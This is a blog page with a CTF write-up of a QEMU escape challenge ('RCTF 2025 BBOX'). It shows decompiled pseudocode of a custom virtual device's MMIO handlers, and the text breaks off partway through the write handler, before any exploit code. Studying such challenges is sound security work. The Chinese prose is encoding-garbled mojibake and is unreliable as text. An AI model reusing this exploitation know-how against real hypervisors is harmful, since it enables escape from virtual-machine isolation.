<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="å†™åœ¨æœ€å‰é¢å¼ºç½‘æ¯å‰çš„çƒ­èº«è®­ç»ƒï¼Œè¿™æ¬¡æ¯”èµ›çš„ pwn é¢˜éš¾åº¦é€‚ä¸­ï¼Œå¾ˆé€‚åˆæˆ‘è¿™ç§èœé¸¡æ¥æ‰“ã€‚å·®ä¸€é“ V8 å°±èƒ½ AK pwnï¼Œå½“æ—¶ V8 å·²ç»èƒ½å®ç° Sandbox å†…ä»»æ„è¯»å†™ï¼Œå¯æ˜¯æ­»æ´»ç»•ä¸å‡º Sandboxï¼Œèµ›åçœ‹äº† Nu1L çš„ exp åå‘ç°åŸæ¥è¿™ä¹ˆç®€å•ï¼Œè€Œä¸”è¿™ä¸ªåˆ©ç”¨æ–¹å¼åœ¨ä¸€äº›è®®é¢˜é‡Œè®²è¿‡å¹¶åœ¨å»å¹´ pwn2own è¢«äººä½¿ç”¨è¿‡ï¼Œæ²¡ AK çœŸçš„éå¸¸å¯æƒœï¼Œåªèƒ½å¯¹è‡ªå·±è¯´èœå°±å¤šç»ƒ :(       è¿™é“ BBO">
<meta property="og:type" content="article">
<meta property="og:title" content="RCTF 2025 BBOX">
<meta property="og:url" content="https://qanux.github.io/2025/11/18/bbox/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="å†™åœ¨æœ€å‰é¢å¼ºç½‘æ¯å‰çš„çƒ­èº«è®­ç»ƒï¼Œè¿™æ¬¡æ¯”èµ›çš„ pwn é¢˜éš¾åº¦é€‚ä¸­ï¼Œå¾ˆé€‚åˆæˆ‘è¿™ç§èœé¸¡æ¥æ‰“ã€‚å·®ä¸€é“ V8 å°±èƒ½ AK pwnï¼Œå½“æ—¶ V8 å·²ç»èƒ½å®ç° Sandbox å†…ä»»æ„è¯»å†™ï¼Œå¯æ˜¯æ­»æ´»ç»•ä¸å‡º Sandboxï¼Œèµ›åçœ‹äº† Nu1L çš„ exp åå‘ç°åŸæ¥è¿™ä¹ˆç®€å•ï¼Œè€Œä¸”è¿™ä¸ªåˆ©ç”¨æ–¹å¼åœ¨ä¸€äº›è®®é¢˜é‡Œè®²è¿‡å¹¶åœ¨å»å¹´ pwn2own è¢«äººä½¿ç”¨è¿‡ï¼Œæ²¡ AK çœŸçš„éå¸¸å¯æƒœï¼Œåªèƒ½å¯¹è‡ªå·±è¯´èœå°±å¤šç»ƒ :(       è¿™é“ BBO">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2025/11/18/bbox/1.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/18/bbox/3.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/18/bbox/2.jpg">
<meta property="article:published_time" content="2025-11-17T16:00:00.000Z">
<meta property="article:modified_time" content="2025-11-18T06:19:20.811Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2025/11/18/bbox/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>RCTF 2025 BBOX</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/12/01/2025%E5%B0%8F%E7%90%90%E7%A2%8E/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/11/07/srh/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/11/18/bbox/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/11/18/bbox/&text=RCTF 2025 BBOX"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/11/18/bbox/&is_video=false&description=RCTF 2025 BBOX"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RCTF 2025 BBOX&body=Check out this article: https://qanux.github.io/2025/11/18/bbox/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/11/18/bbox/&name=RCTF 2025 BBOX&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/11/18/bbox/&t=RCTF 2025 BBOX"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">å†™åœ¨æœ€å‰é¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">ç¨‹åºåˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">æ¼æ´åˆ†æä¸åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%88%B0%E6%9C%80%E5%90%8E"><span class="toc-number">5.</span> <span class="toc-text">å†™åˆ°æœ€å</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        RCTF 2025 BBOX
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-17T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-11-18</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h2><p>å¼ºç½‘æ¯å‰çš„çƒ­èº«è®­ç»ƒï¼Œè¿™æ¬¡æ¯”èµ›çš„ pwn é¢˜éš¾åº¦é€‚ä¸­ï¼Œå¾ˆé€‚åˆæˆ‘è¿™ç§èœé¸¡æ¥æ‰“ã€‚å·®ä¸€é“ V8 å°±èƒ½ AK pwnï¼Œå½“æ—¶ V8 å·²ç»èƒ½å®ç° Sandbox å†…ä»»æ„è¯»å†™ï¼Œå¯æ˜¯æ­»æ´»ç»•ä¸å‡º Sandboxï¼Œèµ›åçœ‹äº† Nu1L çš„ exp åå‘ç°åŸæ¥è¿™ä¹ˆç®€å•ï¼Œè€Œä¸”è¿™ä¸ªåˆ©ç”¨æ–¹å¼åœ¨ä¸€äº›è®®é¢˜é‡Œè®²è¿‡å¹¶åœ¨å»å¹´ pwn2own è¢«äººä½¿ç”¨è¿‡ï¼Œæ²¡ AK çœŸçš„éå¸¸å¯æƒœï¼Œåªèƒ½å¯¹è‡ªå·±è¯´èœå°±å¤šç»ƒ :(  </p>
<img src="/2025/11/18/bbox/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>è¿™é“ BBOX æ˜¯ qemu é€ƒé€¸ï¼Œæƒ³åˆ°åšå®¢å¥½åƒè¿˜æ²¡å•ç‹¬çš„ä¸ºè¿™ç§ç±»å‹çš„é¢˜ç›®å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ‰“ç®—æ°´ä¸€ç¯‡ğŸ¤£  </p>
<p>è¿™é“é¢˜ç›®æ˜¯æˆ‘ç¬¬äºŒå¤©ä¸‹åˆæ‰çœ‹çš„ï¼Œä¸åˆ°ä¸‰å°æ—¶å°±ç§’äº†è¿˜æ¡äº†ä¸ªä¸‰è¡€ï¼ˆç°åœ¨çš„æ–°äººè¿è¿™ä¹ˆç®€å•çš„é¢˜ç›®éƒ½ä¸å±‘äºæ‰“äº†å˜›ğŸ˜­ï¼‰ï¼Œè¦æ˜¯é¢˜ç›®åˆšä¸Šæ—¶å°±æ‰“æ²¡å‡†ä¸€è¡€å°±æœ‰äº†ğŸ˜‡  </p>
<h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><p>åœ¨åˆ†æå‰è¿˜æ˜¯å…ˆç»™ä¸€ä¸‹æˆ‘æ¢å¤ç¬¦å·åçš„ä¼ªä»£ç ï¼Œç›´æ¥çœ‹å°±æ˜¯ä¸€å¨ğŸ’©  </p>
<p><strong>virtsec_mmio_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">virtsec_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, <span class="type">unsigned</span> __int64 offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">virtsec_device_t</span> *dev; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *blk; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v26; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v26 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  dev = VIRTSEC_DEVICE(opaque);</span><br><span class="line">  dest = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( offset &lt;= <span class="number">0xFFF</span> || offset &gt; <span class="number">0x1FFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( offset )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">        dest = <span class="number">0x524F4953</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">        dest = <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">        dest = dev-&gt;reg_3024;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">        dest = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">        dest = dev-&gt;cmd_arg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">        dest = dev-&gt;current_block_id;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">        dest = dev-&gt;dev_size;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1C</span>uLL:</span><br><span class="line">        dest = dev-&gt;reg_3076;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x20</span>uLL:</span><br><span class="line">        dest = dev-&gt;dev_result;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x24</span>uLL:</span><br><span class="line">        dest = dev-&gt;reg_3464;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x28</span>uLL:</span><br><span class="line">        dest = (<span class="type">unsigned</span> <span class="type">int</span>)dev-&gt;write_counter;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x2C</span>uLL:</span><br><span class="line">        dest = (<span class="type">unsigned</span> <span class="type">int</span>)dev-&gt;read_counter;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x30</span>uLL:</span><br><span class="line">        dest = dev-&gt;block_id_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x34</span>uLL:</span><br><span class="line">        dest = dev-&gt;block_id_2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">          qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Invalid read offset 0x%lx\n&quot;</span>, offset, v14, v15, v16, v17);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">      qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Read reg[0x%lx] = 0x%lx\n&quot;</span>, offset, dest, v18, v19, v20);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    index = offset - <span class="number">0x1000</span>;</span><br><span class="line">    blk = virtsec_find_block(dev, dev-&gt;current_block_id);</span><br><span class="line">    <span class="keyword">if</span> ( blk &amp;&amp; blk-&gt;valid )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( blk-&gt;enc_flag )</span><br><span class="line">        virtsec_decrypt_block(dev, blk);</span><br><span class="line">      <span class="keyword">if</span> ( index &gt;= blk-&gt;size )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">          qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Data offset %u &gt;= block size %u\n&quot;</span>, index, blk-&gt;size, v2, v3, v4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        n = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(offset - <span class="number">4092</span>) &gt; blk-&gt;size )</span><br><span class="line">          n = blk-&gt;size - index;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dest, &amp;dev-&gt;data_buffer[blk-&gt;start + index], n);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">          qemu_log(</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Read data buffer[0x%x] = 0x%lx (block_id=%u, size=%u, read_size=%u)\n&quot;</span>,</span><br><span class="line">            index,</span><br><span class="line">            dest,</span><br><span class="line">            blk-&gt;id,</span><br><span class="line">            blk-&gt;size,</span><br><span class="line">            n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( blk )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( blk-&gt;valid != <span class="number">1</span> &amp;&amp; (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">        qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Block %u is not valid\n&quot;</span>, dev-&gt;current_block_id, v9, v10, v11, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Block %u not found\n&quot;</span>, dev-&gt;current_block_id, v5, v6, v7, v8);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_mmio_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">virtsec_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, <span class="type">unsigned</span> __int64 offset, <span class="type">unsigned</span> __int64 value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r9d</span></span><br><span class="line">  u64 srca; <span class="comment">// [rsp+8h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 offset_1; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">void</span> *opaquea; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> n16; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_4; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v20; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">virtsec_device_t</span> *dev; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *blk; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  opaquea = opaque;</span><br><span class="line">  offset_1 = 